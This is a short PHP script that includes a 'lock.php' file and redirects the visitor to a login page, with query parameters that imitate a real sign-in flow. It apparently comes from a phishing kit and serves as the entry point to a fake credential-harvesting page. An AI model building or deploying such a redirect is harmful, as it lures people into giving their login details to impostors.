<?php
include "../../x/lock.php";
header("location: ./login.php?id&section=signinpage&update=&cookiecheck=yes&destination=esignin?Product=user/");
?>